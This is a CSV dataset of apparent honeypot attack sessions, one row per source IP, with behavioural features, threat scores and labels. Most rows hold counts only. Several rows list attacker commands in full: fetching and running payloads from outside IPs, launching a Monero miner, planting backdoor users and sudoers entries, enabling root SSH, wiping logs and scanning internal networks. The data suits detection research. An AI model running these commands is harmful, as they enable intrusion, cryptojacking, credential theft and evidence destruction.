src_ip,total_events,unique_sessions,failed_logins,success_logins,unique_usernames,unique_passwords,unique_dst_ports,unique_protocols,commands_executed,files_downloaded,c2_connections,has_payload,avg_session_duration,total_bytes_sent,total_bytes_received,high_severity_events,medium_severity_events,unique_mitre_techniques,unique_attack_types,compromised_count,commands_list,top_commands,all_commands_unique,unique_commands,suspicious_command_count,uses_downloader,exec_chain_detected,fail_rate,success_rate,user_reuse_ratio,cmd_per_session,bytes_ratio,threat_score,connection_rate,burst_score,anomaly_score,final_label,threat_tier
132.213.169.32,11,1,11,0,7,7,1,1,0,11,11,0,24.0,1306.0,1465.0,11,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.4166666666666666,0.0,0.8908594815825375,6.416666666666667,11.0,0.4799874574305954,0.4987442269366439,known_pattern,low
134.108.154.85,11,1,11,0,6,6,1,1,0,11,11,0,28.0,1508.0,1092.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,1.3796889295516923,4.583333333333333,11.0,0.549033902962195,0.4376446664199168,known_pattern,low
134.82.29.232,8,1,8,0,4,4,1,1,0,8,8,0,3.0,669.0,1278.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,0.5230648944487881,5.333333333333333,8.0,0.4293719622555323,0.4120541597679561,known_pattern,low
135.148.165.123,11,1,11,0,7,6,1,1,0,11,11,0,3.0,1933.0,1003.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.4166666666666666,0.0,1.9252988047808768,5.5,11.0,0.5152490936534969,0.44838662804023927,known_pattern,low
135.216.187.71,8,1,8,0,4,4,1,1,0,8,8,0,23.0,1782.0,312.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,5.693290734824281,5.333333333333333,8.0,0.4076428045222016,0.40228515217977623,known_pattern,low
135.232.66.205,20,1,4,16,2,2,1,1,13,20,20,2,330.0,53056.0,24710.0,20,0,1,1,0,"['cat /etc/hostname', 'hostname', 'uname -s -r', ""grep -r 'password' /home/ubuntu/TaskBoard/Backend/ 2>/dev/null"", 'cat /root/.bash_history', ""grep -r 'mongoose\\|mongodb' /home/ubuntu/TaskBoard/Backend/ --include='*.js' | head -20"", 'env | grep -i api', 'cd /home/ubuntu/TaskBoard/Backend && node server.js &', 'curl http://localhost:3000/api/auth/login -X POST -H \'Content-Type: application/json\' -d \'{""username"":""admin"",""password"":""admin123""}\'', 'node -e ""const mongoose=require(\'mongoose\');mongoose.connect(process.env.MONGO_URI||\'mongodb://localhost/taskboard\');""', 'unset HISTFILE', 'history -c', 'quit']","cat /etc/hostname(1), hostname(1), uname -s -r(1), grep -r 'password' /home/ubuntu/TaskBoard/Backend/ 2>/dev/null(1), cat /root/.bash_history(1)","cat /etc/hostname, hostname, uname -s -r, grep -r 'password' /home/ubuntu/TaskBoard/Backend/ 2>/dev/null, cat /root/.bash_history, grep -r 'mongoose\|mongodb' /home/ubuntu/TaskBoard/Backend/ --include='*.js' | head -20, env | grep -i api, cd /home/ubuntu/TaskBoard/Backend && node server.js &, curl http://localhost:3000/api/auth/login -X POST -H 'Content-Type: application/json' -d '{""username"":""admin"",""password"":""admin123""}', node -e ""const mongoose=require('mongoose');mongoose.connect(process.env.MONGO_URI||'mongodb://localhost/taskboard');""",13,2,1,0,0.1904761904761904,0.7619047619047619,0.6,6.5,2.1470600137590545,7.047619047619048,7.669299792928906,0.1475791085188471,0.5235014548367767,known_pattern,low
136.246.51.176,8,1,8,0,4,4,1,1,0,8,8,0,16.0,979.0,771.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.2681347150259068,4.444444444444445,8.0,0.4877612339611872,0.39771152568661544,known_pattern,low
136.98.4.125,6,1,6,0,2,2,1,1,0,6,6,0,12.0,1442.0,713.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,2.019607843137255,4.285714285714286,6.0,0.7219386154589706,0.43467143044717865,known_pattern,low
139.19.227.104,22,1,5,17,3,3,1,1,15,22,22,0,704.0,73403.0,2533.0,22,0,1,1,0,"['w', 'hostname -f', 'who', 'whoami', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'ls /home/ubuntu/TaskBoard/Backend', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls /home/ubuntu/TaskBoard', 'cat ~/.ssh/known_hosts', 'cat /home/ubuntu/TaskBoard/Backend/middleware/auth.js', 'env | grep -i key', 'cat ~/.profile', ""sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config"", 'cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash', 'disconnect']","w(1), hostname -f(1), who(1), whoami(1), find / -name '*.conf' -readable 2>/dev/null | head -20(1)","w, hostname -f, who, whoami, find / -name '*.conf' -readable 2>/dev/null | head -20, ls /home/ubuntu/TaskBoard/Backend, ls -la /home/ubuntu/TaskBoard/Backend/, ls /home/ubuntu/TaskBoard, cat ~/.ssh/known_hosts, cat /home/ubuntu/TaskBoard/Backend/middleware/auth.js",15,1,0,0,0.217391304347826,0.7391304347826086,0.5,7.5,28.9672454617206,6.782608695652174,8.152476005780848,0.1424279886878438,0.5541150469634369,known_pattern,low
139.23.119.175,9,1,9,0,5,5,1,1,0,9,9,0,8.0,1725.0,424.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,4.0588235294117645,4.5,9.0,0.4843834403864568,0.406360149572648,known_pattern,low
139.46.209.101,8,1,8,0,4,3,1,1,0,8,8,0,12.0,2218.0,1161.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.9087779690189328,4.444444444444445,8.0,0.4433607531232215,0.4083924990886045,known_pattern,low
14.182.85.57,9,1,9,0,5,3,1,1,0,9,9,0,15.0,1160.0,1147.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,1.0104529616724738,4.5,9.0,0.581779077843436,0.4163710679017381,known_pattern,low
14.253.136.70,9,1,9,0,4,5,1,1,0,9,9,0,19.0,517.0,213.0,9,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,2.4158878504672896,6.3,9.0,0.4933245588631311,0.4545745763831034,known_pattern,low
14.98.234.17,6,1,6,0,2,2,1,1,0,6,6,0,13.0,1711.0,965.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,1.7712215320910971,4.285714285714286,6.0,0.4047196097250677,0.405738486624993,known_pattern,low
140.110.232.71,9,1,9,0,4,5,1,1,0,9,9,0,12.0,1210.0,469.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,2.574468085106383,4.5,9.0,0.4630727409661179,0.40441308549234867,known_pattern,low
140.204.228.119,10,1,10,0,6,6,1,1,0,10,10,0,12.0,2008.0,747.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,2.6844919786096257,6.363636363636363,10.0,0.5122000735539534,0.44163744413117734,known_pattern,low
140.251.167.82,19,1,3,16,1,1,1,1,14,19,19,1,325.0,31588.0,28036.0,0,19,1,1,0,"['hostname -f', 'uname -a', 'ls /home', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls -la /home/ubuntu/TaskBoard', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'chmod 777 /tmp/setup.sh', 'wget http://185.220.101.42/payload.sh -O /tmp/payload.sh', 'chmod +x /tmp/payload.sh && bash /tmp/payload.sh', 'bash /tmp/install.sh > /dev/null 2>&1 &', '/tmp/.xmrig -o xmr-eu1.nanopool.org:14444 -u WALLET_ADDR/worker1 --tls -B', 'cat /proc/cpuinfo | grep processor | wc -l', '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', 'logout']","hostname -f(1), uname -a(1), ls /home(1), ls -la /home/ubuntu/TaskBoard/Backend/(1), ls -la /home/ubuntu/TaskBoard(1)","hostname -f, uname -a, ls /home, ls -la /home/ubuntu/TaskBoard/Backend/, ls -la /home/ubuntu/TaskBoard, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh, chmod 777 /tmp/setup.sh, wget http://185.220.101.42/payload.sh -O /tmp/payload.sh, chmod +x /tmp/payload.sh && bash /tmp/payload.sh, bash /tmp/install.sh > /dev/null 2>&1 &",14,4,1,1,0.15,0.8,0.75,7.0,1.1266540642722118,6.45,7.607150721678377,0.1349706420292046,0.6011804416223047,suspicious_activity,medium
141.13.181.231,10,1,10,0,6,6,1,1,0,10,10,0,20.0,939.0,630.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,1.4881141045958794,5.454545454545454,10.0,0.5011871765656339,0.40493782878824874,known_pattern,low
141.88.0.157,9,1,9,0,4,4,1,1,0,9,9,0,17.0,2945.0,665.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,4.421921921921922,4.5,9.0,0.6274024226570093,0.42666386271122764,known_pattern,low
141.90.54.148,11,1,11,0,7,5,1,1,0,11,11,0,11.0,1279.0,235.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.4166666666666666,0.0,5.419491525423729,4.583333333333333,11.0,0.422628531871137,0.46033344512544117,known_pattern,low
142.51.91.139,9,1,9,0,5,5,1,1,0,9,9,0,24.0,2231.0,779.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,2.8602564102564103,5.4,9.0,0.5119043821505321,0.4082530623751224,known_pattern,low
144.188.6.194,7,1,7,0,2,3,1,1,0,7,7,0,27.0,203.0,688.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.75,0.0,0.2946298984034833,4.375,7.0,0.416665600203482,0.434770366199213,known_pattern,low
145.207.206.177,9,1,9,0,4,5,1,1,0,9,9,0,22.0,2716.0,417.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,6.497607655502392,5.4,9.0,0.4236245109612834,0.4266902609383817,known_pattern,low
145.64.227.212,29,1,5,24,3,3,1,1,20,29,29,3,761.0,109688.0,48107.0,0,0,1,1,0,"['cat /etc/os-release', 'w', 'hostname -f', 'id', 'cat /etc/hostname', 'cat /etc/sudoers', 'cat /home/ubuntu/TaskBoard/Backend/config/db.js', 'cat /root/.bash_history', 'node -e ""const mongoose=require(\'mongoose\');mongoose.connect(process.env.MONGO_URI||\'mongodb://localhost/taskboard\');""', 'curl http://localhost:3000/api/auth/login -X POST -H \'Content-Type: application/json\' -d \'{""username"":""admin"",""password"":""admin123""}\'', ""mongo --eval 'db.adminCommand({listDatabases:1})'"", 'curl http://localhost:5000/api/users', 'cd /home/ubuntu/TaskBoard && ls -la', 'shred -u /var/log/auth.log', ""echo '' > /var/log/btmp"", 'rm -f ~/.bash_history', 'cat /dev/null > ~/.bash_history', ""pkill -f 'sshd: root'"", 'rm -rf /var/log/auth.log', 'quit']","cat /etc/os-release(1), w(1), hostname -f(1), id(1), cat /etc/hostname(1)","cat /etc/os-release, w, hostname -f, id, cat /etc/hostname, cat /etc/sudoers, cat /home/ubuntu/TaskBoard/Backend/config/db.js, cat /root/.bash_history, node -e ""const mongoose=require('mongoose');mongoose.connect(process.env.MONGO_URI||'mongodb://localhost/taskboard');"", curl http://localhost:3000/api/auth/login -X POST -H 'Content-Type: application/json' -d '{""username"":""admin"",""password"":""admin123""}'",20,3,1,0,0.1666666666666666,0.8,0.5,10.0,2.280036584351875,5.233333333333333,7.769175127923487,0.1460680128358253,0.5983776520875391,suspicious_activity,medium
147.28.168.23,12,1,12,0,7,7,1,1,0,12,12,0,17.0,2606.0,1316.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.4615384615384615,0.0,1.9787395596051636,5.538461538461538,12.0,0.4314475503273178,0.48150466400992903,known_pattern,low
149.121.0.39,5,1,5,0,1,1,1,1,0,5,5,0,18.0,971.0,705.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.3753541076487252,5.833333333333333,5.0,0.3284346356627686,0.45172164638046797,known_pattern,low
149.122.96.156,6,1,6,0,2,2,1,1,0,6,6,0,17.0,2386.0,948.0,6,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,2.5142255005268703,6.0,6.0,0.505167556163831,0.42454396722303794,known_pattern,low
15.13.225.25,7,1,7,0,3,3,1,1,0,7,7,0,18.0,2065.0,1021.0,7,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,2.0205479452054798,6.125,7.0,0.5657768026221085,0.4335311875622211,known_pattern,low
150.78.106.166,6,1,6,0,2,2,1,1,0,6,6,0,7.0,2213.0,606.0,6,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,3.645799011532125,6.0,6.0,0.4677952079897514,0.426343535766267,known_pattern,low
151.201.184.154,6,1,6,0,2,2,1,1,0,6,6,0,10.0,691.0,494.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,1.395959595959596,5.142857142857143,6.0,0.3703763698992014,0.413935141052236,known_pattern,low
152.84.5.149,6,1,6,0,2,2,1,1,0,6,6,0,15.0,1145.0,1416.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,0.808045165843331,4.285714285714286,6.0,0.42927778114236,0.41119819672109725,known_pattern,low
156.157.123.143,23,1,3,20,1,1,1,1,17,23,23,1,489.0,48660.0,23873.0,0,23,1,1,0,"['who', 'cat /etc/hostname', 'whoami', 'cat /etc/group', 'cat /root/.bash_history', 'ls -la /home', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'find /tmp -type f 2>/dev/null', 'ls /home/ubuntu/TaskBoard/frontend', 'ls -la /dev/shm', 'systemctl restart sshd', 'chmod 600 ~/.ssh/authorized_keys', 'systemctl enable ssh', ""echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"", ""sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config"", ""echo '' > /var/log/wtmp"", 'disconnect']","who(1), cat /etc/hostname(1), whoami(1), cat /etc/group(1), cat /root/.bash_history(1)","who, cat /etc/hostname, whoami, cat /etc/group, cat /root/.bash_history, ls -la /home, ls -la /home/ubuntu/TaskBoard/Backend/, find /tmp -type f 2>/dev/null, ls /home/ubuntu/TaskBoard/frontend, ls -la /dev/shm",17,1,0,0,0.125,0.8333333333333334,0.75,8.5,2.0382005529027394,5.916666666666667,9.294118439396287,0.1535720972485921,0.5704885853482176,suspicious_activity,medium
158.140.77.234,7,1,7,0,2,3,1,1,0,7,7,0,11.0,348.0,1321.0,7,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.75,0.0,0.2632375189107413,6.125,7.0,0.4824175561140031,0.45798975581426815,known_pattern,low
158.60.35.208,12,1,12,0,6,8,1,1,0,12,12,0,3.0,2130.0,1032.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.5384615384615384,0.0,2.0619554695062923,4.615384615384615,12.0,0.5419662703487186,0.49439222177541137,known_pattern,low
159.215.53.78,5,1,5,0,1,1,1,1,0,5,5,0,15.0,748.0,1040.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,0.7185398655139289,5.833333333333333,5.0,0.4499111033087806,0.4503110311981442,known_pattern,low
16.236.102.186,9,1,9,0,5,5,1,1,0,9,9,0,6.0,1551.0,549.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,2.82,5.4,9.0,0.4151803775597757,0.41122598448704767,known_pattern,low
16.59.143.37,5,1,5,0,1,1,1,1,0,5,5,0,10.0,2723.0,751.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,3.621010638297872,5.0,5.0,0.4681228451897901,0.43126364732607236,known_pattern,low
160.214.131.115,8,1,8,0,4,4,1,1,0,8,8,0,3.0,892.0,136.0,8,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,6.510948905109489,6.222222222222222,8.0,0.4751360147201775,0.45212654798772034,known_pattern,low
162.107.171.146,7,1,7,0,3,3,1,1,0,7,7,0,16.0,2616.0,298.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,8.749163879598662,4.375,7.0,0.5144561319091987,0.4164835252092275,known_pattern,low
163.222.161.13,10,1,10,0,5,6,1,1,0,10,10,0,8.0,687.0,773.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,0.8875968992248062,5.454545454545454,10.0,0.5017688308962498,0.40689093496598105,known_pattern,low
164.17.247.78,12,1,12,0,8,7,1,1,0,12,12,0,9.0,1870.0,1260.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.3846153846153846,0.0,1.4829500396510706,5.538461538461538,12.0,0.4495651668008232,0.499455441949996,known_pattern,low
164.225.226.251,8,1,8,0,4,4,1,1,0,8,8,0,17.0,290.0,377.0,8,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,0.7671957671957672,6.222222222222222,8.0,0.548145287938842,0.45046732519770555,known_pattern,low
165.238.107.60,9,1,9,0,5,5,1,1,0,9,9,0,4.0,2868.0,543.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,5.272058823529412,4.5,9.0,0.4640264900848484,0.42073031456210536,known_pattern,low
167.122.212.147,10,1,10,0,5,6,1,1,0,10,10,0,11.0,1371.0,1444.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,0.94878892733564,4.545454545454546,10.0,0.4846136096617525,0.4104150244747839,known_pattern,low
167.76.58.12,10,1,10,0,5,6,1,1,0,10,10,0,29.0,1682.0,408.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,4.112469437652812,5.454545454545454,10.0,0.4286162020088429,0.4187885499314334,known_pattern,low
168.203.39.45,7,1,7,0,3,3,1,1,0,7,7,0,3.0,1419.0,1289.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.1,4.375,7.0,0.4717557117835939,0.40243848286295103,known_pattern,low
169.111.11.154,7,1,7,0,3,3,1,1,0,7,7,0,21.0,1498.0,572.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,2.614310645724258,5.25,7.0,0.4206076207717504,0.39577958189248774,known_pattern,low
17.236.43.159,10,1,10,0,6,5,1,1,0,10,10,0,8.0,1099.0,1262.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,0.8701504354711006,5.454545454545454,10.0,0.4960861862534664,0.41525569677512353,known_pattern,low
170.160.180.201,8,1,8,0,3,4,1,1,0,8,8,0,9.0,1089.0,986.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,1.1033434650455929,5.333333333333333,8.0,0.4084285739957159,0.4048197578148354,known_pattern,low
170.76.194.76,8,1,8,0,4,4,1,1,0,8,8,0,19.0,2221.0,162.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,13.625766871165643,5.333333333333333,8.0,0.5188598638912454,0.42665649933442545,known_pattern,low
172.5.7.46,12,1,12,0,6,6,1,1,0,12,12,0,11.0,575.0,862.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.5384615384615384,0.0,0.6662804171494786,5.538461538461538,12.0,0.4600352458315112,0.47174316370268915,known_pattern,low
172.79.16.77,10,1,10,0,5,6,1,1,0,10,10,0,30.0,2778.0,981.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,2.8289205702647657,4.545454545454546,10.0,0.4661197700483214,0.422876100750827,known_pattern,low
173.43.180.80,12,1,12,0,8,6,1,1,0,12,12,0,15.0,464.0,1421.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769232,0.0,0.3846153846153846,0.0,0.3263009845288326,5.538461538461538,12.0,0.502479294564408,0.5033845542504908,known_pattern,low
173.64.106.131,24,1,5,19,3,3,1,1,16,24,24,1,428.0,14158.0,58002.0,0,0,1,1,0,"['uname -s -r', 'cat /etc/os-release', 'uname -a', 'who', 'cat /etc/hostname', 'cat /etc/hosts', 'ip a', 'arp -a', ""ssh-keygen -t rsa -b 2048 -f /tmp/id_rsa -N ''"", 'ssh -o StrictHostKeyChecking=no root@10.0.1.50 id', 'for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done', ""grep -r 'Host ' ~/.ssh/config 2>/dev/null"", ""ssh -o StrictHostKeyChecking=no ubuntu@172.31.0.10 'cat /etc/passwd'"", ""for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo '192.168.1.'$i' alive'; done"", '/tmp/pnscan 172.31.0.0/16 22', 'logout']","uname -s -r(1), cat /etc/os-release(1), uname -a(1), who(1), cat /etc/hostname(1)","uname -s -r, cat /etc/os-release, uname -a, who, cat /etc/hostname, cat /etc/hosts, ip a, arp -a, ssh-keygen -t rsa -b 2048 -f /tmp/id_rsa -N '', ssh -o StrictHostKeyChecking=no root@10.0.1.50 id",16,0,0,0,0.2,0.76,0.5,8.0,0.2440908228884712,4.88,6.8956600439598335,0.1365323779085823,0.5420546193735564,known_pattern,low
174.18.120.79,10,1,10,0,6,6,1,1,0,10,10,0,24.0,2006.0,292.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,6.84641638225256,4.545454545454546,10.0,0.607123025199732,0.43905015424057936,known_pattern,low
174.210.106.19,8,1,8,0,4,3,1,1,0,8,8,0,28.0,1887.0,1498.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.2588392261507673,4.444444444444445,8.0,0.4571029377393719,0.4179336364190138,known_pattern,low
175.11.153.15,5,1,5,0,1,1,1,1,0,5,5,0,16.0,1002.0,1312.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,0.7631378522467631,5.0,5.0,0.5817806613151244,0.44364815045455086,known_pattern,low
175.171.162.18,29,1,5,24,3,2,1,1,18,29,29,4,613.0,84645.0,28729.0,0,0,1,1,0,"['hostname', 'who', 'uname -a', 'ls -la /root', 'ls /', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", ""find / -name '.env' -type f 2>/dev/null | head -10"", 'cat /etc/passwd', 'cat ~/.bash_profile', 'env | grep -i secret', 'env | grep -i key', 'env | grep -i pass', 'service ssh restart', 'crontab -e', 'useradd -m -s /bin/bash -G sudo backdoor 2>/dev/null', 'usermod -aG sudo backdoor', ""echo 'root:H4ck3d!' | chpasswd"", 'exit']","hostname(1), who(1), uname -a(1), ls -la /root(1), ls /(1)","hostname, who, uname -a, ls -la /root, ls /, find / -name '*.conf' -readable 2>/dev/null | head -20, find / -name '.env' -type f 2>/dev/null | head -10, cat /etc/passwd, cat ~/.bash_profile, env | grep -i secret",18,0,0,0,0.1666666666666666,0.8,0.5,9.0,2.9462234597981203,5.1,9.59333098094566,0.1376878289008577,0.5909421702338373,suspicious_activity,medium
175.77.115.84,11,1,11,0,7,7,1,1,0,11,11,0,23.0,961.0,898.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.4166666666666666,0.0,1.0689655172413792,5.5,11.0,0.5337340458902547,0.44660052336682404,known_pattern,low
179.157.247.86,21,1,5,16,3,2,1,1,13,21,21,1,637.0,105948.0,2483.0,0,21,1,1,0,"['uname -a', 'hostname -f', 'w', 'hostname', 'uname -s -r', ""pkill -f 'sshd: root'"", ""echo '' > /var/log/btmp"", 'rm -rf /var/log/syslog', 'history -c', 'service sshd restart', ""(crontab -l; echo '@reboot /tmp/.sshd &') | crontab -"", 'crontab -e', 'quit']","uname -a(1), hostname -f(1), w(1), hostname(1), uname -s -r(1)","uname -a, hostname -f, w, hostname, uname -s -r, pkill -f 'sshd: root', echo '' > /var/log/btmp, rm -rf /var/log/syslog, history -c, service sshd restart",13,0,0,0,0.2272727272727272,0.7272727272727273,0.5,6.5,42.65217391304348,5.818181818181818,8.096593647386921,0.1313665349646507,0.5911338707652193,suspicious_activity,medium
18.216.98.245,8,1,8,0,4,4,1,1,0,8,8,0,6.0,2663.0,786.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,3.383735705209657,5.333333333333333,8.0,0.4445176628889427,0.4029686230482889,known_pattern,low
182.24.138.106,8,1,8,0,4,4,1,1,0,8,8,0,25.0,2304.0,294.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,7.810169491525424,4.444444444444445,8.0,0.5164867527500119,0.41609396177505636,known_pattern,low
183.104.23.162,10,1,10,0,6,6,1,1,0,10,10,0,8.0,308.0,1125.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,0.2735346358792184,5.454545454545454,10.0,0.5719078084782638,0.432930018001527,known_pattern,low
183.190.231.45,10,1,10,0,6,6,1,1,0,10,10,0,8.0,2463.0,1199.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,2.0525,5.454545454545454,10.0,0.5144072126604741,0.41891349263454786,known_pattern,low
184.167.240.210,22,1,5,17,3,3,1,1,14,22,22,2,572.0,26495.0,8061.0,0,22,1,1,0,"['whoami', 'w', 'id', 'uname -s -r', 'wget -qO- ipinfo.io', 'curl -s icanhazip.com', 'ip a', 'for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done', 'ssh -o StrictHostKeyChecking=no root@10.0.1.50 id', ""ssh -o StrictHostKeyChecking=no ubuntu@172.31.0.10 'cat /etc/passwd'"", ""nmap -p 22 --open 10.0.0.0/8 -T4 --max-retries 1 2>/dev/null | grep 'Nmap scan'"", ""for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo '192.168.1.'$i' alive'; done"", 'masscan 10.0.0.0/8 -p22 --rate=5000 2>/dev/null', 'disconnect']","whoami(1), w(1), id(1), uname -s -r(1), wget -qO- ipinfo.io(1)","whoami, w, id, uname -s -r, wget -qO- ipinfo.io, curl -s icanhazip.com, ip a, for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done, ssh -o StrictHostKeyChecking=no root@10.0.1.50 id, ssh -o StrictHostKeyChecking=no ubuntu@172.31.0.10 'cat /etc/passwd'",14,2,1,0,0.217391304347826,0.7391304347826086,0.5,7.0,3.286405358471843,6.086956521739131,6.71274047629945,0.1214248407407555,0.5685041265340396,known_pattern,low
185.108.117.220,7,1,7,0,3,3,1,1,0,7,7,0,15.0,324.0,1220.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,0.2653562653562653,4.375,7.0,0.3485001904674318,0.4160298039183752,known_pattern,low
